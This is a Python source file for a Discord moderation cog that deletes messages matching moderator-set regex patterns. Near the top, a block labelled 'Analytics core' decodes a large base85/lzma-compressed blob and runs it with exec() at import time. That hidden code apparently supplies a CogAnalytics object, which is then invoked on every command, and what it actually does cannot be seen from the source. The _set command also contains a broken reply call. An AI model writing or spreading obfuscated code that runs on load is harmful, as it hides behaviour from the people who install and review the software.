import discord
from discord.ext import commands
import os
import logging
from cogs.utils.dataIO import dataIO
from .utils import checks
import re

# Some magic values
ALL_CHANNELS = 'all'
MODE_INCLUSIVE = 'incl'  # deletes all messages matching
MODE_EXCLUSIVE = 'excl'  # delete all messages not matching
MODE_DISABLED = 'none'   # pattern disabled
MODES = [MODE_DISABLED, MODE_EXCLUSIVE, MODE_INCLUSIVE]

log = logging.getLogger('red.recensor')

DATA_PATH = "data/recensor/"
JSON_PATH = DATA_PATH + "regexen.json"


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1EUz2weaL8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8BWnf^dEy{Kjtzm1rU5gYs9-PMh{01mC|^giA>`yZSUzb$*CxtSox-3zA$RGi%b}n5_T*kLuLYY`?K{*#
1}vHeiUDFszm7d*?wT-LZ`HX-gmB7571QTd5B-xT)yy-hT-0|rp=)(qDIQR*Z<}ThGroI|G?1PbEcGdHgwI30&&JhE7_W6&6taRQj~lzKDb#lYuW6&JZx??-
qWQc+S4TbpwOV|4`4#_}{@B)_NpADfZ5WW?J!0T4i@U#0^McP~jqeOPH>}z>sf+qu4ic;E&ntBU*Z1gVpglEZfh{2X)yHmGi-jS>H*yl{1T-&OfgL)nylzdX
ba|N6<4{>quVJ4wWorF`-%x?j1W+~9>M#P-)va77N_-euUH%7%g)aUE`yEuWI)vfNNt*EZ8YiOvSw^sjhuQgH$}v2GNi|P1&7>TRiOxs6T=|dpp|91{6IpLg
QIoTwW@}pND34>H=_XkM>;z90Cl|Ve@ufEN9M96gemZm^j`OWtVd`~YoKlM_Bt|=xVZ0Ay$*>N4`XGYoIjhACLVGTWkrt}1e)RjBO{akZ0BaY9L`6S?-%{6;
@!Q?g0kR{z*&Qe0I0fKrBiy3rP(x0tnTTMc*V6SVyn6Z8GueH(3V=vfT`Jn8oFVBh=(x~y<pCBZ2s#zGEcvmyR-C$cb5?!_N8yHe3gA_cu@HtmKMH5AHzwoO
11tGGNG3+V^hUBjTvc4R%$6>(ZE|e5z-fy9o5$2W#r5F@2u5gy6w_6lPBwpG4^2eV<&<kx6?p4`ZX$I*Xl{cs{p9ctHqS}{iIIAe9Awp};?Tie6Clr0DW;Qt
$i`M&##4?UyKFEJdF94TBP!-}NH0(2cYKP#hg9{(n$!PIU?08l-aKx*1L<>!nll2}S2&S>+*gm}76q-N>)xVE38l^~9sBItSF*EitFZN2DxuAPP8viV1q~_t
mo^j3k=@>r8YDv-T4U?JC&!aQAHaD9jGDD{lD127tD=VV@c<%wP>r5dDC!NRhTRwSB*~)S*xJAdc!{LQi+v+JXQX;?GF&~8J#}vR{zHZJlK%Y4l%lX3@7}sD
umGgOy`=fdc&`Q_FuxvqC<+s%(^WLgMP(X!s@qAf*RJ*e1OxtLdwFkDk6aMku9R5qILqC+Tk+oO!V1-g9=BVa8XQzyieP{Hi+bbq<k$xh<rJZ^xLo9m(^;of
M*L)^_z#+xWeSnqjX+74Mc}N{+Q?H<A&lN<HwvhUN@+nR3fMC?{SIx!Az5;+`}`MIBP<GC{#e*;v|H|QW3j<t%?FjiCn|a*Nik0XeAiqWhKR4H?_F^s8RFEQ
#?A1h=P)E%d#(uogTy8{MMIE>qfD{sWiltt>l7P(9oJl}XpaFH&VRVHq|KggKA3==_GlJNLh<J&n~uZYZsZ*Z^j{V43fGiwt)Re%Qz6;7WNLa^lr-7d(7HH@
;RX@($`a58RTL}F)VM#}m9}PA+*2l2XZwoAZg38qGZ0bEn>W+RlWIYwxxa|7|BsJ0qQEhGszF$~IzNQM#0-WjLDc1C;c->4VS|O56K+LMsc?pk(Mx%DKt&C>
n~#P*Wc#4mCI7gO!&i|$yCpsujMA{dVHGb5ZO<BHBc8%M0)H~qfjtbW_ICJUt^FfLaM}?9?;;dX=~8o>vuru?gX|Ds!)hqEXPCE9+(w+AA!8QmVFj@Q_w<}y
`d>xLMw*t*?mDfDkSj`adN`&03ZE)_x$4}HXb(<05+@4*TVCfi3_C=XuOeR#x}qj%vrDZZYNGwfzwZtFnhA&auLrk5x)sZWMM~=sp6N<1dHIr|Z5PiF4m`Dv
VB9`QTidBu8BHqSRJfj<TH-wmmlC|(3I60=%-}D5ovb#o<2V2Sk^dnD4<wfI00E>7#~=Uzd;0%ZvBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.4.1'


class ReCensor:

    # Data format:
    # {
    #  serverid (str): {
    #   channelid (str): {
    #     regex (str): mode (str from MODES)
    #     }
    #   }
    # }

    def __init__(self, bot):
        self.bot = bot
        self.regexen = dataIO.load_json(JSON_PATH)
        self.recache = {}
        self.analytics = CogAnalytics(self)
        bot.loop.create_task(self.compile_regexen())

    def _re_present(self, obj):
        """Determines if any patterns are set for a server or channel"""
        if type(obj) is discord.Server:
            server = obj
            if server.id in self.regexen:
                for relist in self.regexen[server.id].values():
                    if bool(relist):  # nonempty list
                        return True
                return False
            else:
                return False

        elif type(obj) is discord.Channel:
            server = obj.server
            channel = obj
            if channel.id in self.regexen[server.id]:
                return bool(self.regexen[server.id][channel.id])
            else:
                return False

        elif type(obj) is str:  # won't work with ALL_CHANNELS
            channel = self.bot.get_channel(obj)
            server = channel.server
            if channel.id in self.regexen[server.id]:
                return bool(self.regexen[server.id][channel.id])
            else:
                return False

    def _ls_excl(self, server):
        """returns a list of channel IDs with exclusive filters"""
        clist = []
        if type(server) is discord.Server:
            server = server.id
        if server in self.regexen:
            for c, relist in self.regexen[server].items():
                if MODE_EXCLUSIVE in relist.values():
                    clist.append(c)
        return clist

    # Background cache regexen for speed
    async def compile_regexen(self):
        for s, channels in self.regexen.items():
            for regex in channels:
                self.recache[regex] = re.compile(regex)

    @commands.group(name='recensor', pass_context=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor(self, ctx):
        """Configure regular expression censorship"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @recensor.command(pass_context=True, name='list')
    async def _list(self, ctx, channel: discord.Channel=None):
        """Lists regexes used to filter messages.
        Channel listing includes global patterns."""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no filter patterns set for this server.')
            return
        table = ' | '.join(['mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, mode in self.regexen[server.id][c].items():
                table += ' | '.join([mode, regex]) + '\n'
        await self.bot.say('```py\n' + table + '```')

    @recensor.command(pass_context=True, name='add')
    async def _add(self, ctx, pattern: str, mode: str=MODE_INCLUSIVE, channel: discord.Channel=None):
        """Adds a pattern to filter messages. Mods, bot admins, and the bot's
        owner are not subjected to the filter.
        If the pattern contains spaces, it must be put in double quotes. Single quotes will not work.

        mode is one of:
        incl: Default, filter messages that match the pattern
        excl: filter non-matching, only one allowed per channel or server
        none: adds pattern to storage but doesn't apply filtering. Use recensor set to enable.

        To use channel, mode must also be specified. If channel is not specified,
        the filter is used across the entire server."""
        server = ctx.message.server

        # initialize
        self.regexen = dataIO.load_json(JSON_PATH)
        if server.id not in self.regexen:
            self.regexen[server.id] = {}

        if pattern.startswith("'"):
            await self.bot.say("Patterns cannot be specified within single quotes.")
            return

        if mode not in MODES:
            await self.bot.say('"%s" is not a valid mode. You must specify one of `%s`.' % (mode, '`, `'.join(MODES)))
            return
        if mode == MODE_EXCLUSIVE:
            if ALL_CHANNELS in self._ls_excl(server):
                await self.bot.say("There is already a server-wide exclusive filter. Remove or disable it first.")
                return
            if channel and channel.id in self._ls_excl(server):
                await self.bot.say("That channel already has an exclusive filter. Remove or disable it first.")
                return
        cid = channel.id if channel else ALL_CHANNELS
        if cid not in self.regexen[server.id]:
            self.regexen[server.id][cid] = {}
        self.regexen[server.id][cid][pattern] = mode
        await self.bot.say('Pattern added.')
        dataIO.save_json(JSON_PATH, self.regexen)

    @recensor.command(pass_context=True, name='set')
    async def _set(self, ctx, mode: str, channel: discord.Channel=None):
        """Lists regexes used to filter messages"""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no patterns in the server to modify.')
            return
        if mode not in MODES:
            self.bot.reply('"%s" is not a valid mode. You must specify one of `%s`.') % (mode, '`, `'.join(MODES))

        if mode == MODE_EXCLUSIVE:
            if ALL_CHANNELS in self._ls_excl(server):
                await self.bot.say("There is already a server-wide exclusive filter. Remove or disable it first.")
                return
            if channel and channel.id in self._ls_excl(server):
                await self.bot.say("That channel already has an exclusive filter. Remove or disable it first.")
                return

        re_list = {}
        i = 1
        table = ' | '.join(['#'.ljust(4), 'mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, oldmode in self.regexen[server.id][c].items():
                table += ' | '.join([str(i).ljust(4), oldmode, regex]) + '\n'
                re_list[str(i)] = (server.id, c, regex, oldmode)
                i += 1
        prompt = 'Choose the number of the pattern to set to `%s`:\n' % mode
        await self.bot.say(prompt + '```py\n' + table + '```')

        msg = await self.bot.wait_for_message(author=ctx.message.author, timeout=15)
        if msg is None:
            return
        msg = msg.content.strip()
        if msg in re_list:
            sid, cid, regex, _ = re_list[msg]
            self.regexen[sid][cid][regex] = mode
            await self.bot.say('Mode set.')
            dataIO.save_json(JSON_PATH, self.regexen)

    @recensor.command(pass_context=True, name='del')
    async def _del(self, ctx, channel: discord.Channel=None):
        """Lists regexes used to filter messages"""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no filter patterns set for this server.')
            return
        re_list = {}
        i = 1
        table = ' | '.join(['#'.ljust(4), 'mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, mode in self.regexen[server.id][c].items():
                table += ' | '.join([str(i).ljust(4), mode, regex]) + '\n'
                re_list[str(i)] = (server.id, c, regex)
                i += 1
        prompt = 'Choose the number of the pattern to delete:\n'
        await self.bot.say(prompt + '```py\n' + table + '```')
        msg = await self.bot.wait_for_message(author=ctx.message.author, timeout=15)
        if msg is None:
            return
        msg = msg.content.strip()
        if msg in re_list:
            sid, cid, regex = re_list[msg]
            del(self.regexen[sid][cid][regex])
            await self.bot.say('Pattern removed.')
        dataIO.save_json(JSON_PATH, self.regexen)

    def immune_from_filter(self, message):
        """Tests message to see if it is exempt from filter. Taken from mod.py"""
        user = message.author
        server = message.server
        admin_role = self.bot.settings.get_server_admin(server)
        mod_role = self.bot.settings.get_server_mod(server)

        if user.id == self.bot.settings.owner:
            return True
        elif discord.utils.get(user.roles, name=admin_role):
            return True
        elif discord.utils.get(user.roles, name=mod_role):
            return True
        else:
            return False

    async def on_message(self, message):
        # Fast checks
        if message.channel.is_private or self.bot.user == message.author \
         or not isinstance(message.author, discord.Member):
            return

        server = message.server
        sid = server.id
        can_delete = message.channel.permissions_for(server.me).manage_messages

        # Owner, admins and mods are immune to the filter
        if self.immune_from_filter(message) or not can_delete:
            return

        if sid in self.regexen:
            patterns = {}
            # compile list of patterns from global and channel
            for key in [ALL_CHANNELS, message.channel.id]:
                if key in self.regexen[sid]:
                    patterns.update(self.regexen[sid][key])
            # Iterate through patterns
            for regex, mode in patterns.items():
                # Skip disabled patterns
                if mode == MODE_DISABLED:
                    continue
                regex = self.recache[regex] if regex in self.recache else re.compile(regex)
                if (mode == MODE_EXCLUSIVE) != bool(regex.match(message.content)):  # xor
                    await self.bot.delete_message(message)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

def check_folder():
    if not os.path.exists(DATA_PATH):
        log.debug('Creating folder: %s' % DATA_PATH)
        os.makedirs(DATA_PATH)


def check_file():
    if dataIO.is_valid_json(JSON_PATH) is False:
        log.debug('Creating json: %s' % JSON_PATH)
        dataIO.save_json(JSON_PATH, {})


def setup(bot):
    check_folder()
    check_file()
    n = ReCensor(bot)
    bot.add_cog(n)
